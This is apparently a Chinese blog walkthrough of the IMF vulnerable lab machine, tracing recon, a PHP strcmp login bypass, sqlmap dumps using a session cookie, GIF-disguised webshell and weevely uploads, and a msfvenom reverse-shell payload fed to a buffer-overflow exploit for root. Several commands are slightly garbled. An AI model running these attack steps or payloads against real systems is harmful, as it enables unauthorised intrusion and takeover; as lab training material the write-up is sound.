+++
title = "IMF"
date = 2026-06-15T20:24:51+08:00
draft = false
description = "一些打过的靶机"
tags = ["靶机"]
categories = ["靶机"]
series = ["靶机"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++

  
  

# 1.信息收集

## 1.主机发现

因为靶机与宿主机在同一网段，所以用二级扫描来发现靶机ip **arp-scan -l**

发现目标主机 **192.168.170.59**

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692384-e76f134a-9308-42ae-97fb-4c803169c1af.png)

## 2.端口扫描

```
nmap -sC -sV -O 192.168.170.59
```

//-sC常见漏洞脚本扫描 -sV开放端口服务/版本号 -O操作系统探测

发现就开了一个80端口

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692431-9e73893c-3fd3-45ba-8ad2-e7f98c52553d.png)

## 3.访问web服务

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692361-835534ee-1771-4a33-a38c-de13beafa023.png)点击如图选项

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692310-02b87da7-ec80-4e82-8ea2-4b81e087ddd9.png)

右击查看源代码发现第一个flag flag1{YWxsdGhlZmlsZXM=}

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692547-4c944ab4-e883-4331-ad99-40c7b2e7018a.png)

易知是base64编码进行解码 得到字符串：allthefiles

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410694505-badf35ef-69d0-4781-830f-0f83feee15d0.png)

点击首页第一个选项查看源码，这三段有点像base64编码

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695017-48a90511-8cc2-4b5c-8519-a0d6be61bca1.png)

这三段进行拼接 ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==

base64解码

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695022-be34df30-a69b-4926-8011-597f05fce5f6.png)

得到 flag2{aW1mYWRtaW5pc3RyYXRvcg==}

再进行解码 得到 imfadministrator

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695308-cdb787ab-31b6-4970-81f9-ec25a91e9fda.png)

访问一下imfadministrator路径，发现是一个登陆界面

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695500-ef800930-dcb0-4440-92dd-b5621a420319.png)查看网页源码

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695827-d62e1067-d2af-4d47-be54-15169ce98713.png)

随便输入用户名和密码，点登录，页面回显提示：“无效的用户名”

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696315-93b624b2-36ff-4b1e-93a8-678d7d318b3f.png)

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696229-cd7db54a-c5b4-4e4e-b777-2ab4b478a4b5.png)

使用第一个用户名（rmichaels）登录时，发现页面回显变成了“无效的密码”，说明我们的用户名是正确的

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696377-0f77d2a2-63ab-4266-94c3-63921ec3bdcc.png)

既然知道了正确的用户名，就可以使用burpsuite抓包爆破出密码，右键，选择转发到Intruder  
但是抓包爆破密码太慢了我们选择放弃

# 2.漏洞利用

burp抓包进行绕过  
这里参考代码php strcmp比较字符串绕过：字符串和数组进行比较

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696698-c8f8d8b6-e5ac-497c-a350-3c09a270d486.png)

a的输入为非字符串类型数据，就会报错，自动return 0  
我们可以将pass以数组的方式传输数据，使其报错。//pass后面加上[]  
得到flag3{Y29udGludWVUT2Ntcw==}

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696950-128a7811-514d-46b1-832a-4a18faca7cc8.png)

进行解码 continueTOcms

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410697364-19d3af84-f9de-4a7b-923e-15fba3461c64.png)

关闭抓包，页面跳转到如下界面

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410697408-2eded067-1d77-4c10-bd28-923883fa8855.png)

点击IMF CMS进入新的页面

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410697624-25374a55-1d87-48a0-b394-1bb6a9cbd183.png)

在url地址栏加单引号测试下，发现有报错回显，说明存在sql注入漏洞

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410697790-966e08c7-9425-4640-9a24-a26e568e9e01.png)看了大佬的打法 ： 发现这里因为是基于登录之后的sql注入，所以使用sqlmap需要加上cookie值  
所以我们先抓包记录一下cooike值：PHPSESSID=cfffkp2kd0lhqj3u54ina62911

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410697949-75c3c111-f75e-410c-ad39-f8780f251647.png)

直接上sqlmap，获取数据库名：

```
sqlmap -o -u "http://192.168.170.59/imfadministrator/cms.php?pagename=home" --  
cookie="PHPSESSID=cfffkp2kd0lhqj3u54ina62911" --batch -dbs
```

o: 表示将结果输出到文件。  
-u 指定目标 URL，即待测试的网址。  
--cookie="PHPSESSID=76gll2kk80bthftu7adt9re7g2": 指定了 HTTP 请求中的 Cookie 信息，这是为  
了在测试中保持用户的身份验证状态。  
--batch: 设置 SQLMap 在运行时遇到多个可能性时自动选择默认选项，而不需要用户交互。  
-dbs: 表示检测数据库名称。

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410698383-31e217b5-fff3-427d-8dad-16e74ee2e445.png)

获取admin数据库的表名，发现里面只有一个pages表

```
sqlmap -o -u "http://192.168.170.59/imfadministrator/cms.php?pagename=home" --  
cookie="PHPSESSID=cfffkp2kd0lhqj3u54ina62911" --batch -D admin -tables
```

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410698321-9c3aac08-3d1a-4550-bcc5-ea50e2c7cb94.png)

获取pages表里面的全部内容：  
```
sqlmap -o -u "http://192.168.170.59/imfadministrator/cms.php?pagename=home" --  
cookie="PHPSESSID=cfffkp2kd0lhqj3u54ina62911" --batch -D admin -T pages --dump
```

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410698912-342327be-d88c-496e-944e-e9b8ea32e78e.png)

访问一下上面这两个图片路径，有一个二维码

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410698917-927fbab7-87fd-4cbb-b3bb-c8d791f08d22.png)

手机扫一下 flag4{dXBsb2Fkcjk0Mi5waHA=}

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410699309-d0a1a1f9-52dc-48d5-bab5-2e1da71467b4.png)

解码 发现是一个php页面 uploadr942.php

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410699839-c450ba0c-34df-45d1-b696-172d98859852.png)

进行访问 发现是文件上传的页面

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410700309-17221c02-c2a3-47fa-b6ef-cc931c3e512b.png)

制作一个图片马1.gif，其中GIF89a是 GIF 图片文件的文件头：

GIF89a

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410700336-38b19c1a-0223-4fe3-8555-362397776e8d.png)

上传这个1.gif文件，显示上传成功

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410700712-2410523a-5119-4e3a-beef-087f19fa96f3.png)

查看一下网页源码，发现上传的文件名被改了

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410700913-2f10f4d5-cebe-4bef-85fd-7714bbc5523b.png)

访问此路径 发现成功 http://192.168.170.59/imfadministrator/uploads/ca5c4475a969.gif

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410701082-e61c04bb-08d2-4fbd-bba1-8f25bd849edc.png)

接下来我们制作一个webshell的图片马

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410701437-d4e69cf8-e4e0-47f2-ac34-7011975682d3.png)

利用和上面相同的方法上传，访问如下路径，发现flag5  

```
http://192.168.170.59/imfadministrator/uploads/2a596597bca9.gif?a=ls
```

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410701791-bc449750-bc28-4cb8-934c-9821913fd65f.png)

获取得flag5{YWdlbnRzZXJ2aWNlcw==} 然后解码得 agentservices

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410701848-1fb3ef07-067b-40c6-b8aa-9332228b9e22.png)

#   
3.获取目标靶机shell

我们可以使用kali中自带的weevely工具生成php文件，然后把php文件合并至gif图片中，随后进行上传  
命令：

```
weevely generate jesse 111.php
```

使用 Weevely 工具生成一个名为 111.php 的 Web Shell 文件，并设置密码为 jesse。

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410702087-24d4e5df-1309-47bf-a406-b626f7007e15.png)

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410702132-40db7e01-5cd3-425d-8b36-99678c79da9d.png)

将生成的111.php文件后缀改为.gif，随意添加GIF数值

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410702459-9a85c225-3a6b-4d43-9c37-a057ddf7b1cb.png)

上传这个111.gif木马文件 上传成功

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410702670-29cf1350-aa78-4524-b1f4-182a18742cc3.png)

查看网页源码，记录下这个被修改后的文件名

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410702808-19c67e01-e2e5-4b3a-a36f-0d5a89ce4a67.png)

b45aa6489ed5

用weevely工具连接木马文件：

```
weevely http://192.168.170.59/imfadministrator/uploads/b45aa6489ed5.gif jesse
```  

成功获取靶机shell

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410702812-04c4ebb0-d534-4ae6-9b83-ef8f68b727f4.png)

此时也能看到flag5 验证那一步的合理性

# 4.提权

查看一下系统版本：lsb_release -a

发现是16.04的ubuntu

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410703199-c96c66e3-7506-4e8a-a6fc-134002254bff.png)

根据提示查找文件  

```
find / -name agent &>2/dev/unull
```

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410703649-1da49d53-1fdb-4112-9e5b-b9e49064a55d.png)

在/usr/local/bin目录发现提示的信息,agent文件

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410703876-aed24232-59ee-443a-b9a6-bdcd98a5ebd3.png)

查看agent发现是ELF 32位执行文件

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410703986-8cb21dcb-a4a8-4252-8f43-2bbe53544d4f.png)

用cat命令查看access_codes，发现提示SYN 7482,8279,9467  
这边提示端口试探，我们可以使用knock命令试探一下

```
knock -v 192.168.0.154 7482 8279 9467
```

发现不好敲

然后直接用nmap敲端口

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410704116-d6bf3442-0e0c-4403-87f7-bc6fcf6c083e.png)

连接一下7788端口,发现需要输入正确的id

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410704448-fed6de0c-f67b-4ab3-962d-7176d177c2c9.png)

我们先将agent文件下载到本地然后再分析  
命令:

```
file_download /usr/local/bin/agent /home/kali/桌面/2/agent
```

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410704630-929ea240-637e-46db-9aba-05b1eadadbbc.png)

找到目录 加权

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410705004-b4f50232-181f-4c4d-b447-4d20ec0cb1b8.png)

命令：

```
ltrace./agent
```

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410705286-c956cfa6-b04b-4401-80df-968c5813b6c7.png)

随便输入yyyyy爆出真实id 48093572

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410705347-4714d63e-c12f-4dcc-b816-a7004b6713d6.png)

再次执行输入正确ID有三个选项

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410705735-0d2b5779-827f-4577-84eb-bbdc87a3799d.png)

然后构造payload  

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.170.20 LPORT=4489 -b "\x00\x0a\x0" -f
```

```
python -o /home/kali/桌面/2/k.py //这里LHOST是本机地址
```

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410706121-b7b31148-136d-4257-b916-45774e912987.png)

进行查看

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410706172-3467bc34-fea0-487c-bd55-78fe33188d9d.png)

生成这段shellcode之后，我们需要编写一个缓冲区溢出漏洞sploit的exp,我这边是直接在github上找了  
大佬写好的exp

红色代码替换成上述代码即可

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410706597-788c9769-fea5-4e6d-be9c-7d588304bd4e.png)

开启监听 

```
nc -lvvp 4489
```

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410706572-b180110f-1285-47d5-9f59-ad98025d9557.png)

使用exp和对应的shellcode对7788服务器进行缓冲区溢出攻击  

```
python2 3.py 192.168.170.59 7788
```


![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410707215-7ba90e1e-6e90-4de8-969f-40b4cfc1b37c.png)

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410707379-7f6835da-7778-4a1c-84ae-d1a07abb865a.png)

拿到最后一个flag flag6{R2gwc3RQcm90MGMwbHM=}  
解密 Gh0stProt0c0ls 意为幽灵协议

![](https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410707391-419e2c64-93ea-4300-a817-de9f3518087f.png)